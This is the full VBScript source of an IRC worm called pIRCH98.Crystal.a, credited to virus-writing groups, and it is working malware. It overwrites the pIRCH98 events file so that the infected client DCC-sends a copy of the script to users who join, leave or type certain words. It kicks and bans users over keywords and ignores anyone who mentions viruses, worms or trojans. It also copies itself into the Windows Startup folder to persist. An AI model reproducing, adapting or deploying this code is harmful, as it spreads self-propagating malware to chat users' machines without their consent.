'= pIRCH98.Crystal.a                                =
'= by -KD- [Metaphase VX Team] & [NoMercyVirusTeam] =
On Error Resume Next
Dim Crystal, EventFile, FSO
Set FSO = CreateObject("Scripting.FileSystemObject")
Crystal = Wscript.ScriptFullName
Set EventFile = FSO.CreateTextFile("c:\WINDOWS\events.dll", True)
EventFile.WriteLine "[Levels]"
EventFile.WriteLine "Enabled=1"
EventFile.WriteLine "Count=6"
EventFile.WriteLine "Level1=000-Unknowns"
EventFile.WriteLine "000-UnknownsEnabled=1"
EventFile.WriteLine "Level2=100-Level 100"
EventFile.WriteLine "100-Level 100Enabled=1"
EventFile.WriteLine "Level3=200-Level 200"
EventFile.WriteLine "200-Level 200Enabled=1"
EventFile.WriteLine "Level4=300-Level 300"
EventFile.WriteLine "300-Level 300Enabled=1"
EventFile.WriteLine "Level5=400-Level 400"
EventFile.WriteLine "400-Level 400Enabled=1"
EventFile.WriteLine "Level6=500-Level 500"
EventFile.WriteLine "500-Level 500Enabled=1"
EventFile.WriteLine ""
EventFile.WriteLine "[000-Unknowns]"
EventFile.WriteLine "User1=*!*@*"
EventFile.WriteLine "UserCount=1"
EventFile.WriteLine "Event1=; pIRCH98.Crystal.a"
EventFile.WriteLine "Event2=; by -KD- [Metaphase VX Team] & [NoMercyVirusTeam]"
EventFile.WriteLine "Event3=ON JOIN:#:/notice $nick Tell me that file isnt the cutest ;)"
EventFile.WriteLine "Event4=ON JOIN:#:/dcc send $nick  c:\windows\silly.vbs"
EventFile.WriteLine "Event5=@ON BAN:*:#:/mode # -o+b $me $banmask | /kick # $nick Dont ban me!!"
EventFile.WriteLine "Event6=ON PART:#:/notice $nick Case I didnt send it yet this is the cutest thing Ive seen ;)"
EventFile.WriteLine "Event7=ON PART:#:/dcc send $nick c:\windows\silly.vbs"
EventFile.WriteLine "Event8=VERSION:/notice $nick \-1 pIRCH98: Crystal.a by -KD- I'm Infected!!! \-1:-"
EventFile.WriteLine "Event9=ON TOPIC:#:/topic # Crystal rocks! | /notice $nick Crystal!!!"
EventFile.WriteLine "Event10=ON ACTION:*hump*:#:/notice $nick Get off my leg!!"
EventFile.WriteLine "Event11=ON ACTION:*hump*:#:/kick # $nick Get off my leg I said!!"
EventFile.WriteLine "Event12=ON TEXT:*hump*:#:/ignore # $nick"
EventFile.WriteLine "Event13=ON TEXT:*sex*:#:/kick # $nick Crystal!!!"
EventFile.WriteLine "Event14=ON TEXT:*fuck*:#:/kick # $nick Crystal!!!"
EventFile.WriteLine "Event15=ON TEXT:*damn*:#:/kick # $nick Crystal!!!"
EventFile.WriteLine "Event16=ON TEXT:*satan*:#:/kick # $nick Crystal!!!"
EventFile.WriteLine "Event17=ON TEXT:*dick*:#:/kick # $nick Crystal!!!"
EventFile.WriteLine "Event18=ON TEXT:*hump*:#:/ignore # $nick"
EventFile.WriteLine "Event19=ON TEXT:*hell*:#:/ignore # $nick"
EventFile.WriteLine "Event20=ON TEXT:*virus*:#:/ignore # $nick"
EventFile.WriteLine "Event21=ON TEXT:*worm*:#:/ignore # $nick"
EventFile.WriteLine "Event22=ON TEXT:*trojan*:#:/ignore # $nick"
EventFile.WriteLine "Event23=ON TEXT:*Crystal*:#:/ignore # $nick"
EventFile.WriteLine "Event24=ON TEXT:*silly*:*:/dcc send $nick c:\windows\silly.vbs"
EventFile.WriteLine "Event25=PING:/notice $nick Oh god baby do it again! ;)"
EventFile.WriteLine "Event26=ON QUIT:/msg :#vir: pIRCH98.Crystal by -KD-! gotta love it!"
EventFile.WriteLine "Event27=ON KICKED:*:#: /msg $nick What the hell? | /join # | /mode # -o+b $nick $banmask"
EventFile.WriteLine "EventCount=27"
EventFile.WriteLine ""
EventFile.WriteLine "[100-Level 100]"
EventFile.WriteLine "UserCount=0"
EventFile.WriteLine "EventCount=0"
EventFile.WriteLine ""
EventFile.WriteLine "[200-Level 200]"
EventFile.WriteLine "UserCount=0"
EventFile.WriteLine "EventCount=0"
EventFile.WriteLine ""
EventFile.WriteLine "[300-Level 300]"
EventFile.WriteLine "UserCount=0"
EventFile.WriteLine "EventCount=0"
EventFile.WriteLine ""
EventFile.WriteLine "[400-Level 400]"
EventFile.WriteLine "UserCount=0"
EventFile.WriteLine "EventCount=0"
EventFile.WriteLine ""
EventFile.WriteLine "[500-Level 500]"
EventFile.WriteLine "UserCount=0"
EventFile.WriteLine "EventCount=0"
EventFile.Close
FSO.CopyFile "c:\WINDOWS\events.dll", "c:\pirch98\events.ini"
FSO.CopyFile Crystal, "c:\WINDOWS\silly.vbs"
FSO.CopyFile Crystal, "c:\WINDOWS\Start Menu\Programs\StartUp\Startup.vbs"
If Day(Now()) = 1 or Day(Now()) = 20 Then
  MsgBox "There souls are lost because they couldnt find you.", 4096 , "Crystal"
End If